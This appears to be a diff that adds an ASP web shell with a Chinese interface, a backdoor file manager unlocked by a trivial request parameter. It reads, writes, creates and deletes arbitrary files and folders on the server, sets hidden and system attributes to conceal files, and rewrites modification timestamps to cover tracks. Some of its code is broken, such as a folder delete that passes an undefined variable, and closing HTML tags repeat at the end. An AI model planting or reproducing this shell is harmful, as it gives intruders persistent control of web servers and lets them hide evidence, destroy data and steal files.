@@ -1,0 +1,163 @@
+<object runat="server" id="fso" scope="page" classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
+<%if request("z")="1" then session("z")="g1o"%><%
+'on error resume next
+if session("z")<>"g1o" then 
+	response.write "<center><br><form action='' method='post'>"
+	response.write "<input name='z' type='password' size='10'> "
+	response.write "<input type='submit' value='Eevil_Angle'></center>"
+else
+	dim filecontent:filecontent=""
+	DFile=request.Form("DFile")
+	if DFile<>"" then
+		response.write "正在打开程序 ...<br>"
+		Select Case Cint(request.Form("act"))
+			Case 1
+				Call DelFile(DFile)
+			Case 2
+				Call AddAttrib(DFile)
+			Case 3
+				Call DelAttrib(DFile)
+			Case 4
+				Call ModifyTime(DFile)
+			Case 5
+				Call ModifyText(DFile)
+			Case 6
+				Call buildfolder(DFile)
+			Case 7
+				Call readfile(DFile)
+			Case 8
+				Call delfolder(DFile)
+		End Select
+	end if
+end if
+Function readfile(TheFile)
+	response.write "正在读取内容:"&TheFile&" ...<br>"
+	Set fileObj = fso.opentextfile("\\.\"&TheFile,1,true) 
+	filecontent = fileObj.readall 
+	fileObj.close
+	Set fileObj = nothing
+	Response.write("（他妹的提醒您）读取成功！")
+End Function
+Function ModifyText(TheFile)
+	StrContent=request.Form("newtext")
+	response.write "正在替换内容:"&TheFile&" ...<br>"
+	TheFile="\\.\"&TheFile
+	IF fso.FileExists(TheFile) then
+	Set ff=fso.CreateTextFile(TheFile,true)
+	ff.Write StrContent
+	Response.write("（他妹的提醒您）修改成功！")
+	Else
+	Set ff=fso.CreateTextFile(TheFile,true)
+	ff.Write StrContent
+	Response.write("（他妹的提醒您）建立成功！")
+	END IF
+	set ff=nothing
+End Function
+Function buildfolder(Foldername)
+	response.write "正在建立目录:"&Foldername&" ...<br>"
+	fso.CreateFolder(Foldername)
+	Response.write("（他妹的提醒您）建立成功！")
+End Function
+Function delfolder(Foldername)
+	response.write "正在删除目录:"&Foldername&" ...<br>"
+	fso.deleteFolder Foldername,false
+	Response.write("（他妹的提醒您）删除成功！")
+End Function
+Function ModifyTime(TheFile)
+	newTime=request.Form("newtime")
+	response.write "正在修改文件的最后修改时间:"&TheFile&" ...<br>"
+	Set shell=Server.CreateObject("Shell.Application")
+	Set app_path=shell.NameSpace(server.mappath("."))
+	Set app_file=app_path.ParseName(Replace(TheFile,server.mappath(".")&"\",""))
+	app_file.Modifydate=newTime
+	response.write "（他妹的提醒您）修改文件的最后修改时间成功！"
+End Function
+Function DelAttrib(TheFile)
+	response.write "正在减属性:"&TheFile&" ...<br>"
+	IF fso.FileExists("\\.\"&TheFile) then
+		set f=fso.GetFile("\\.\"&TheFile)
+		f.Attributes=0
+		set f=nothing
+		response.write "（他妹的提醒您）减属性成功！"
+	else
+		response.write "文件没找到！"
+	END IF	
+End Function
+Function AddAttrib(TheFile)
+	response.write "正在加属性:"&TheFile&" ...<br>"
+	IF fso.FileExists("\\.\"&TheFile) then
+		set f=fso.GetFile("\\.\"&TheFile)
+		f.Attributes=1+2+4+32
+		set f=nothing
+		response.write "（他妹的提醒您）加属性成功！"
+	else
+		response.write "文件没找到！"
+	END IF
+End Function
+Function DelFile(TheFile)
+	response.write "正在删除:"&TheFile&" ...<br>"
+	if Right(TheFile,1)="\" or Right(TheFile,1)="/" or Left(Right(TheFile,4),1)<>"." then
+		Call fso.DeleteFolder(EE,true)
+		response.write "（他妹的提醒您）删除成功！"
+	else
+		IF fso.FileExists("\\.\"&TheFile) then
+			FN=LCase(Mid(TheFile,InStrRev(Replace(TheFile,"\","/"),"/")+1))
+			if Instr(FN,"com")<1 and Instr(FN,"con")<1 and Instr(FN,"aux")<1 and Instr(FN,"prn")<1 and Instr(FN,"nul")<1 then
+			set f=fso.GetFile("\\.\"&TheFile)
+			f.Attributes=0
+			set f=nothing
+			end if
+			
+			fso.Deletefile("\\.\"&TheFile)
+			response.write "（他妹的提醒您）删除成功！"
+		else
+			response.write "文件没找到！"
+		end if
+	end if
+End Function
+%>
+<%if session("z")="g1o" then %>
+<script>
+function delfile(){form1.act.value=1;form1.submit()}
+function addattrib(){form1.act.value=2;form1.submit()}
+function delattrib(){form1.act.value=3;form1.submit()}
+function modifytime(){form1.act.value=4;form1.submit()}
+function modifytext(){form1.act.value=5;form1.submit()}
+function buildfolder(){form1.act.value=6;form1.submit()}
+function readfile(){form1.act.value=7;form1.submit()}
+function delfolder(){form1.act.value=8;form1.submit()}
+</script><title>他妹的文件修改</title>
+<form id="form1" name="form1" method="post" action="">
+  <table width="600" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td height="30" colspan="2">
+      <input name="DFile" type="text" id="DFile" value="<%if DFile<>"" then response.write Replace(DFile,"\\.\","") else response.write  Replace(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),Mid(Request.ServerVariables("SCRIPT_NAME"),InStrRev(Replace(Request.ServerVariables("SCRIPT_NAME"),"\","/"),"/")+1),"") end if%>" style="width:500px"/></td>
+      <td height="30">
+      <input type="button" name="b7" id="b6" value="读文件内容" onclick="readfile()" style="width:100px"/></td>
+    </tr>
+    <tr>
+      <td width="350" height="30"><input type="button" name="button" id="button" value="删除" onclick="delfile()"/>
+        <input type="button" name="b2" id="b2" value="加属性"  onclick="addattrib()"/>
+        <input type="button" name="b3" id="b3" value="减属性"  onclick="delattrib()"/>
+        <input type="button" name="b6" id="b5" value="建目录"  onclick="buildfolder()"/>
+        <input type="button" name="b4" id="b4" value="删目录"  onclick="delfolder()"/></td>
+      <td align="right"><input type="hidden" name="act" id="hiddenField" />
+      <input type="hidden" name="z" id="hiddenField" value="<%=session("z")%>"/>
+      <input name="newtime" type="text" id="newtime" value="<%=now%>"/></td>
+      <td align="right">
+      <input name="b4" type="button" id="b4" onclick="modifytime()" value="改时间属性" style="width:100px"/>
+      </td>
+    </tr>
+    <tr>
+      <td colspan="2" valign="top">
+      <textarea name="newtext" id="newtext" rows=5 style="width:500px;height:80px"><%=server.HTMLEncode( filecontent)%></textarea></td>
+      <td align="right" valign="top">
+      <input name="b5" type="button" onclick="modifytext()" value="替换内容" style="height:80px;width:100px"/>
+      </td>
+    </tr>
+  </table>
+</form>
+<%end if%>
+</body></html></body></html>
+</body></html></body></html>
+</body></html>
